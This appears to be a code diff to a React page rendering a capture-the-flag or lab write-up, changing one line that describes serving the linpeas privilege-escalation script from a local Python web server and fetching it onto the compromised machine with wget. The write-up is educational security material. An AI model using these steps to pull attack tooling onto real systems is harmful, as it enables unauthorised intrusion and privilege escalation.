@@ -108,7 +108,7 @@ export const Writeup3 = () => {
 
                     So I downloaded a binary file of linpeas into the directory of my python server.
                     I typed in <code className="code-font">python -m http.server</code> which starts a web server serving files in that directory. Then, on the remote machine,
-                    I typed in <code className="code-font">wget [http://localip/linpeas.sh](http://192.168.158.46:8000/linpeas.sh)</code> which downloads the binary onto the remote machine.<br />
+                    I typed in <code className="code-font">wget http://localip/linpeas.sh</code> which downloads the binary onto the remote machine.<br />
 
                     After running the command, I searched for text highlighted in red and yellow which indicates a high vulnerability vector.
                 </p>
